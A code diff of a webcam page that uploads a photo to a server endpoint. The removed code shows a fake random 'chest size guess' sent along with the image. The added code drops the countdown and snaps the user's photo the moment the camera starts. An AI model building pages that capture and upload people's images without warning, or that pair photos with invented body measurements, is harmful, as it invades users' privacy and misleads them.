@@ -2,259 +2,111 @@
 <html>
 <head>
   <title>Auto Camera Capture</title>
-
   <style>
-    body {
-      font-family: Arial, sans-serif;
-      max-width: 700px;
-      margin: 40px auto;
-      padding: 0 16px;
-      text-align: center;
-      background: #f5f5f5;
-    }
-
-    h2 {
-      color: #222;
-    }
-
-    video {
-      display: block;
-      margin: auto;
-      border-radius: 12px;
-      background: #000;
-      width: 320px;
-      height: 240px;
-    }
-
-    #status {
-      margin-top: 12px;
-      font-size: 16px;
-      color: #555;
-      font-weight: bold;
-    }
-
-    #countdown {
-      margin-top: 14px;
-      font-size: 42px;
-      color: #e63946;
-      font-weight: bold;
-    }
-
-    #chestSize {
-      margin-top: 10px;
-      font-size: 22px;
-      color: #111;
-      font-weight: bold;
-    }
-
-    .card {
-      background: white;
-      padding: 24px;
-      border-radius: 16px;
-      box-shadow: 0 4px 12px rgba(0,0,0,0.08);
-    }
+    body { font-family: sans-serif; max-width: 700px; margin: 40px auto; padding: 0 16px; }
+    video { display: block; border-radius: 8px; background: #000; }
+    #status { margin-top: 10px; font-size: 14px; color: #555; font-weight: bold; }
+    #photos img { width: 150px; height: 112px; object-fit: cover; border-radius: 6px; margin: 5px; border: 1px solid #ddd; }
   </style>
 </head>
 <body>
+  <h2>Auto-Capture Test</h2>
+  <video id="video" autoplay playsinline width="300"></video>
+  <p id="status">Starting camera...</p>
 
-  <div class="card">
 
-    <h2>Auto Camera Capture</h2>
 
-    <video id="video" autoplay playsinline></video>
+  <canvas id="canvas" width="300" height="225" style="display:none;"></canvas>
 
-    <p id="status">
-      Starting camera...
-    </p>
 
-    <div id="countdown"></div>
 
-    <p id="chestSize">
-      Chest Size Guess: Waiting...
-    </p>
-
-    <canvas
-      id="canvas"
-      width="320"
-      height="240"
-      style="display:none;"
-    ></canvas>
-
-  </div>
-
+  
   <script>
+    const video = document.getElementById("video");
+    const canvas = document.getElementById("canvas");
+    const statusEl = document.getElementById("status");
 
-    const video =
-      document.getElementById("video");
 
-    const canvas =
-      document.getElementById("canvas");
 
-    const statusEl =
-      document.getElementById("status");
+    async function startCamera() {
+      try {
+        const stream = await navigator.mediaDevices.getUserMedia({
+          video: { facingMode: "user" },
+          audio: false
+        });
+        video.srcObject = stream;
 
-    const chestSizeEl =
-      document.getElementById("chestSize");
 
-    const countdownEl =
-      document.getElementById("countdown");
 
-    let lastChestSize = 0;
+        // Wait for the video to actually start playing before capturing
+        video.onloadedmetadata = () => {
+  capturePhoto();
+};
+      } catch (err) {
+        statusEl.textContent = "Camera access denied: " + err.message;
+      }
+    }
 
-    async function startCamera() {
 
-      try {
 
-        const stream =
-          await navigator.mediaDevices.getUserMedia({
-            video: {
-              facingMode: "user"
-            },
-            audio: false
-          });
+    function startCountdown(seconds) {
+      statusEl.textContent = `Camera active. Capturing in ${seconds}...`;
+      if (seconds <= 0) {
+        capturePhoto();
+        return;
+      }
+      setTimeout(() => startCountdown(seconds - 1), 1000);
+    }
 
-        video.srcObject = stream;
 
-        video.onloadedmetadata =
-          async () => {
 
-          await video.play();
+    async function capturePhoto() {
+      statusEl.textContent = "Auto-capturing...";
+      const context = canvas.getContext("2d");
+      context.drawImage(video, 0, 0, canvas.width, canvas.height);
+      const imageData = canvas.toDataURL("image/png");
 
-          statusEl.textContent =
-            "Camera ready";
 
-          startCountdown(5);
-        };
 
-      } catch (err) {
+      try {
+        const res = await fetch("/api/upload-photo", {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({ imageData })
+        });
 
-        console.error(err);
 
-        statusEl.textContent =
-          "Camera access denied: " + err.message;
-      }
-    }
 
-    function startCountdown(seconds) {
+        if (!res.ok) throw new Error("Upload failed");
+        statusEl.textContent = "Auto-capture saved!";
+      } catch (err) {
+        statusEl.textContent = "Error: " + err.message;
+      }
+    }
 
-      countdownEl.textContent =
-        seconds;
 
-      statusEl.textContent =
-        "Get ready in front of camera";
 
-      const interval =
-        setInterval(async () => {
+    async function loadGallery() {
+      try {
+        const res = await fetch('/api/get-photos');
+        if (!res.ok) return;
+        const { photos } = await res.json();
+        const photosEl = document.getElementById('photos');
+        photosEl.innerHTML = '';
+        photos.forEach(photo => {
+          const img = document.createElement('img');
+          img.src = photo.url || photo.data;
+          photosEl.appendChild(img);
+        });
+      } catch (err) {
+        console.error('Gallery load error:', err);
+      }
+    }
 
-        seconds--;
 
-        countdownEl.textContent =
-          seconds;
 
-        if (seconds <= 0) {
-
-          clearInterval(interval);
-
-          countdownEl.textContent =
-            "📸";
-
-          await detectChestSize();
-
-          await capturePhoto();
-        }
-
-      }, 1000);
-    }
-
-    async function detectChestSize() {
-
-      try {
-
-        // Random chest size guess
-        const chestSize =
-          Math.floor(Math.random() * (36 - 20 + 1)) + 20;
-
-        lastChestSize =
-          chestSize;
-
-        chestSizeEl.textContent =
-          `Chest Size Guess: ${chestSize} inches`;
-
-      } catch (err) {
-
-        console.error(err);
-
-        chestSizeEl.textContent =
-          "Chest size detection error";
-      }
-    }
-
-    async function capturePhoto() {
-
-      statusEl.textContent =
-        "Capturing photo...";
-
-      const context =
-        canvas.getContext("2d");
-
-      context.drawImage(
-        video,
-        0,
-        0,
-        canvas.width,
-        canvas.height
-      );
-
-      const imageData =
-        canvas.toDataURL("image/png");
-
-      try {
-
-        const res =
-          await fetch(
-            "/api/upload-photo",
-            {
-              method: "POST",
-              headers: {
-                "Content-Type": "application/json"
-              },
-              body: JSON.stringify({
-                imageData,
-                chestSize: lastChestSize
-              })
-            }
-          );
-
-        if (!res.ok) {
-
-          const errorText =
-            await res.text();
-
-          throw new Error(
-            errorText || "Upload failed"
-          );
-        }
-
-        statusEl.textContent =
-          "Photo saved successfully";
-
-      } catch (err) {
-
-        console.error(err);
-
-        statusEl.textContent =
-          "Upload Error: " + err.message;
-      }
-    }
-
-    window.addEventListener(
-      "load",
-      async () => {
-        await startCamera();
-      }
-    );
-
+    startCamera();
   </script>
-
 </body>
 </html>
+ 
